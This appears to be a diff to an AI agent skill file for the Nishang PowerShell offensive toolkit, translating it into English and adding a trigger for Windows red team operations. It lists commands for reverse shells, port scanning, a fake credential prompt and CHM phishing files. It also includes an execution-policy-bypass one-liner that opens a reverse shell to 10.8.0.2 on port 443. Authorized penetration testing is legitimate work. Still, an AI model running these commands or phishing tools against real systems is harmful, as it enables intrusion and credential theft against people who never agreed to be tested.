@@ -2,40 +2,44 @@
 name: nishang-powershell
 description: "Nishang: PowerShell penetration toolkit. Signals: red team, methodology, load framework, reverse shell, port scan."
 zh-signals: "Nishang: PowerShell 渗透脚本全家桶。信号:红队,方法论,加载框架,反弹,端口扫。"
+when-to-use: >-
+  Use during Windows red team operations when you need ready-made offensive
+  PowerShell scripts for reverse shells, port scanning, host information, or
+  phishing artifacts.
 ---
 
 # Nishang
 
-- 攻击大类:C50 红队方法论与自动化
-- 上游仓库:https://github.com/samratashok/nishang
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C50 Red Team Methodology and Automation
+- Upstream Repository: https://github.com/samratashok/nishang
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/samratashok/nishang
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `Import-Module ./Nishang.ps1` | 加载框架 |
-| `Invoke-PowerShellTcp -Reverse -IPAddress x -Port 443` | 反弹 |
-| `Invoke-PortScan` | 端口扫 |
-| `Get-Information` | 系统信息 |
-| `Invoke-CredentialsPhish` | 弹凭据框 |
-| `Out-CHM` | 生成 CHM 钓鱼文件 |
-| `HTTP-Listener` | HTTP 服务 |
+| `Import-Module ./Nishang.ps1` | Load the framework |
+| `Invoke-PowerShellTcp -Reverse -IPAddress x -Port 443` | Reverse shell |
+| `Invoke-PortScan` | Port scan |
+| `Get-Information` | System information |
+| `Invoke-CredentialsPhish` | Pop up a credential prompt |
+| `Out-CHM` | Generate a CHM phishing file |
+| `HTTP-Listener` | HTTP service |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### PowerShell 渗透脚本全家桶
+### PowerShell Penetration Script Toolkit
 
 ```bash
 powershell -ep bypass -c 'Import-Module ./nishang/Nishang.ps1; Invoke-PowerShellTcp -Reverse -IPAddress 10.8.0.2 -Port 443'
 ```
 
-## 注意事项
+## Notes
 
-Offensive PowerShell 经典集;脚本可单独拷贝使用,与 Empire/WinPwn 互补。
+A classic collection of offensive PowerShell scripts; scripts can be copied and used standalone, complementing Empire/WinPwn.
